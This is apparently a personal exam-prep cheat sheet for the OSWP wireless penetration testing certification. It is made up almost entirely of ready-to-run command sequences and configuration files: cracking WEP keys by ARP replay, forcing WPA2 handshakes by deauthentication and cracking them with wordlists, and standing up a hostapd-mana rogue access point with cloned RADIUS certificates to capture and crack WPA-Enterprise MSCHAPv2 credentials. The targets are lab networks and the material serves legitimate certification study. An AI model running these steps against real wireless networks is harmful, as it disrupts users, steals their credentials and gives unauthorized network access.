# OSWP - OSWP Exam Prep

## WEP

```bash
# 1. Prepare the environment
mkdir -p ~/oswp/wep && cd ~/oswp/wep
sudo airmon-ng check kill
sudo iw reg set US
sudo airmon-ng start wlan0

# 2. Recon: identify the WEP network
sudo airodump-ng --band abg wlan0mon

# Take note of:
# BSSID = AP MAC address
# CH    = channel
# ESSID = network name

# Example:
# BSSID = F0:9F:C2:71:22:11
# CH    = 3
# ESSID = wifi-old

# 3. Focused capture on the target AP
sudo airodump-ng -c <CHANNEL> --bssid <AP_BSSID> -w wep wlan0mon

# Example:
sudo airodump-ng -c 3 --bssid F0:9F:C2:71:22:11 -w wep wlan0mon

# 4. Fake authentication in another terminal and leave it running
sudo aireplay-ng -1 3600 -q 10 -a <AP_BSSID> wlan0mon

# Example:
sudo aireplay-ng -1 3600 -q 10 -a F0:9F:C2:71:22:11 wlan0mon

# 5. ARP replay to quickly generate IVs in another terminal
sudo aireplay-ng --arpreplay -b <AP_BSSID> -h <YOUR_INTERFACE_MAC> wlan0mon

# Example:
sudo aireplay-ng --arpreplay -b F0:9F:C2:71:22:11 -h 02:00:00:00:00:00 wlan0mon

# 6. Crack the WEP key in another terminal and leave it running
sudo aircrack-ng wep-01.cap

# Alternative PTW attack:
sudo aircrack-ng -z -b F0:9F:C2:71:22:11 wep-01.cap

# 7. Create the client configuration file
nano ~/oswp/wep/wep.conf
````

Content of `~/oswp/wep/wep.conf`:

```bash
network={
    ssid="<ESSID>"
    key_mgmt=NONE
    wep_key0=<RECOVERED_HEX_KEY> # without colons
    wep_tx_keyidx=0
}

# Example:
network={
    ssid="wifi-old"
    key_mgmt=NONE
    wep_key0=<RECOVERED_HEX_KEY>
    wep_tx_keyidx=0
}
```

```bash
# If using the same wireless card, stop monitor mode first
sudo airmon-ng stop wlan0mon

# 8. Connect to the WEP network
sudo wpa_supplicant -i wlan0 -c ~/oswp/wep/wep.conf

# 9. Obtain an IP address
sudo dhclient wlan0 -v

# 10. Validate access
ip a
ip route
curl -L http://192.168.1.1
curl http://192.168.1.1/proof.txt
```

---

## WPA/WPA2-PSK

```bash
# 1. Prepare the environment
mkdir -p ~/oswp/wpa && cd ~/oswp/wpa
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 2. Recon: identify the WPA/WPA2-PSK network
sudo airodump-ng --band abg wlan0mon

# Take note of:
# BSSID = AP MAC address
# CH    = channel
# ESSID = network name

# Example:
# BSSID = F0:9F:C2:71:22:12
# CH    = 6
# ESSID = wifi-mobile

# 3. Focused capture on the target AP
sudo airodump-ng wlan0mon --bssid <AP_BSSID> -c <CHANNEL> -w wpa

# Example:
sudo airodump-ng wlan0mon --bssid F0:9F:C2:71:22:12 -c 6 -w wifi-wpa

# 4. Force client reconnection using deauthentication
sudo aireplay-ng -0 10 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon

# Example:
sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:12 -c 72:EC:8F:92:23:53 wlan0mon

# If directed deauthentication does not work, try broadcast deauthentication
sudo aireplay-ng -0 10 -a <AP_BSSID> wlan0mon

# Example:
sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon

# 5. Wait for a valid WPA handshake to appear in airodump-ng
# Example:
# WPA handshake: 02:00:00:BE:00:00

# 6. Crack the passphrase with aircrack-ng
sudo aircrack-ng -w /usr/share/john/password.lst wpa-01.cap

# Example with another wordlist:
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt wifi-wpa-01.cap

## Cracking with Hashcat

	# Convert the capture to Hashcat hc22000 format
	hcxpcapngtool -o <output_file>.hc22000 <capture_file>.cap
	
	# Run Hashcat
	hashcat -m 22000 <output_file>.hc22000 /usr/share/john/password.lst

# 7. Optional: confirm the recovered passphrase
sudo airdecap-ng -p <PASSWORD> -e <ESSID> <capture_file>.cap

# 8. Create the client configuration file
nano /tmp/wpa.conf
```
```bash
network={
    ssid="<ESSID>"
    key_mgmt=WPA-PSK
    psk="<PASSWORD>"
    bssid=<AP_BSSID>
}

# Example:
network={
    ssid="wifi-mobile"
    key_mgmt=WPA-PSK
    psk="starwars1"
    bssid=F0:9F:C2:71:22:12
}
```

```bash
# Stop monitor mode before connecting
sudo airmon-ng stop wlan0mon

# 9. Connect to the network
sudo wpa_supplicant -i wlan0 -c /tmp/wpa.conf

# 10. Obtain an IP address
sudo dhclient wlan0 -v

# 11. Validate access
ip -br a
ip route
curl -L http://192.168.1.1
curl http://192.168.1.1/proof.txt
```

## WPA/WPA2-Enterprise

### WPA-Enterprise uses 802.1X/EAP with RADIUS authentication, which is different from WPA-PSK. Common inner authentication methods include PEAP/MSCHAPv2, EAP-TTLS, and EAP-TLS.

```bash
# 1. Prepare the environment
mkdir -p ~/oswp/wpa-enterprise && cd ~/oswp/wpa-enterprise
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 2. Recon: identify the WPA-Enterprise network
sudo airodump-ng --band abg wlan0mon

# Take note of:
# BSSID = AP MAC address
# CH    = channel
# ESSID = network name
# AUTH  = MGT

# AUTH = MGT indicates WPA/WPA2-Enterprise / 802.1X

# Example:
# BSSID = F0:9F:C2:71:22:15  
# CH = 44  
# ESSID = wifi-corp  
# AUTH = MGT

# 3. Focused capture on the target AP
sudo airodump-ng -c <CHANNEL> --bssid <AP_BSSID> -w peap_recon --output-format pcap wlan0mon

# Example:
sudo airodump-ng -c 44 --bssid F0:9F:C2:71:22:15 -w peap_recon --output-format pcap wlan0mon

# 4. Capture the EAP authentication exchange
sudo aireplay-ng -0 10 -a <AP_BSSID> wlan0mon

# Example:
sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:15 wlan0mon

# Note:
# You may see a "WPA handshake" message, but the real objective here is the
# EAP/TLS certificate exchange, not a PSK handshake for aircrack-ng.

# 5. Extract the target certificate details
tshark -r peap_recon-01.cap \
-Y "wlan.bssid == F0:9F:C2:71:22:15 && eap && tls.handshake.certificate" \
-V | grep rdnSequence: -A 1 | head -n 5

# Alternative certificate extraction
tshark -r peap_recon-01.cap \
-Y "wlan.bssid == F0:9F:C2:71:22:15 && eap && tls.handshake.certificate" \
-V | grep -E "issuer:|subject:|id-at-countryName|id-at-stateOrProvinceName|id-at-localityName|id-at-organizationName|id-at-organizationalUnitName|id-at-commonName|pkcs-9-at-emailAddress"
```

### Take note of the Certificate Authority and RADIUS server attributes.

Example:

```bash
countryName = ES  
stateOrProvinceName = Madrid  
localityName = Madrid  
organizationName = WiFiChallenge  
emailAddress = ca@WiFiChallenge.com  
commonName = "WiFiChallenge CA"
```

```bash
# 6. Modify the CA certificate configuration
cd /etc/freeradius/3.0/certs
sudo nano ca.cnf
```

Example `ca.cnf` section:

```bash
[certificate_authority]
countryName = ES  
stateOrProvinceName = Madrid  
localityName = Madrid  
organizationName = WiFiChallenge  
emailAddress = ca@WiFiChallenge.com  
commonName = "WiFiChallenge CA"
```

```bash
# 7. Modify the RADIUS server certificate configuration
sudo nano server.cnf
```

Example `server.cnf` section:

```bash
[server]
countryName = ES  
stateOrProvinceName = Madrid  
localityName = Madrid  
organizationName = WiFiChallenge  
emailAddress = server@WiFiChallenge.com  
commonName = "WiFiChallenge CA"
```

```bash
# 8. Generate the certificates
rm dh
openssl dhparam -out dh -2 2048
make clean
make

# If make fails, also check client.cnf.
# If client.cnf was accidentally deleted, search for a copy:
find /usr/share -name client.cnf 2>/dev/null
```

Example `client.cnf` section:

```bash
[client]
countryName = ES  
stateOrProvinceName = Madrid  
localityName = Madrid  
organizationName = WiFiChallenge  
emailAddress = client@WiFiChallenge.com  
commonName = "WiFiChallenge CA"
```

### Verify the generated certificates:

```bash
openssl x509 -in server.pem -noout -subject -issuer
openssl x509 -in ca.pem -noout -subject
```

```bash
# 9. Create the EAP user file
cat << EOF > /tmp/mana.eap_user
* PEAP,TTLS,TLS,FAST
"t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2 "pass" [2]
EOF
```

```bash
# 10. Create the hostapd-mana configuration
nano /tmp/network.conf
```

Example `/tmp/network.conf`:

```bash
interface=wlan2  # EDIT THIS
driver=nl80211
ssid=wifi-corp            # EDIT THIS
channel=44             # EDIT THIS

# 2.4 GHz: hw_mode=g
# 5 GHz:   hw_mode=a
hw_mode=a              # EDIT THIS

ieee8021x=1
eap_server=1
eap_user_file=/tmp/mana.eap_user

ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
private_key_passwd=whatever

dh_file=/etc/freeradius/3.0/certs/dh

auth_algs=1
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP
rsn_pairwise=CCMP

mana_wpe=1
mana_eapsuccess=1
mana_credout=/tmp/hostapd.credout
```

```bash
# 11. Start the rogue AP
sudo hostapd-mana /tmp/network.conf

# Optional: verify the channel activity
sudo airodump-ng -c <CHANNEL> wlan0mon

# Example:
sudo airodump-ng -c 11 wlan0mon

# 12. Force the client to reconnect
sudo aireplay-ng -0 10 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon

# Example:
sudo aireplay-ng -0 20 -a F0:9F:C2:71:22:15 -c 64:32:A8:BA:6C:41 wlan0mon

# If there is no specific client:
sudo aireplay-ng -0 20 -a F0:9F:C2:71:22:15 wlan0mon

# 13. Check captured credentials / hashes
cat /tmp/hostapd.credout

## Crack the captured MSCHAPv2 / NetNTLM material
# Hashcat
nano hash1.txt

hashcat -m 5500 hash1.txt /usr/share/john/password.lst --force
hashcat -m 5500 hash1.txt /usr/share/wordlists/rockyou.txt --force

# John the Ripper
nano hash2.txt

john --format=netntlm hash2.txt --wordlist=/usr/share/john/password.lst
john --format=netntlm hash2.txt --wordlist=/usr/share/wordlists/rockyou.txt

# 15. Create the WPA-Enterprise client configuration
nano /tmp/enterprise.conf
```
```bash
network={
    ssid="<ESSID>"
    scan_ssid=1
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="<DOMAIN\\USER>"
    password="<CRACKED_PASSWORD>"
    phase1="peaplabel=0"
    phase2="auth=MSCHAPV2"
}

# Example:
network={
    ssid="Roogna"
    scan_ssid=1
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="Castle\humphrey"
    password="skywalker"
    phase1="peaplabel=0"
    phase2="auth=MSCHAPV2"
}
```
```bash
# 16. Connect to the real WPA-Enterprise network
sudo wpa_supplicant -i wlan0 -c /tmp/enterprise.conf

# 17. Obtain an IP address
sudo dhclient wlan0 -v

# 18. Validate access
ip -br a
ip route
curl -L http://192.168.1.1
curl http://192.168.1.1/proof.txt
```

### Reset FreeRADIUS Certificate Directory
Use this if the certificate generation process breaks or if the cert directory needs to be reset.

```bash
cd /etc/freeradius/3.0/certs

rm -f *.pem *.der *.crt *.csr *.key *.p12 *.crl dh
rm -f serial* index.txt*

echo 01 > serial
touch index.txt

openssl dhparam -out dh -2 2048
make clean
make
```

### Verify the certificates:

```bash
openssl x509 -in server.pem -noout -subject -issuer
openssl x509 -in ca.pem -noout -subject
```
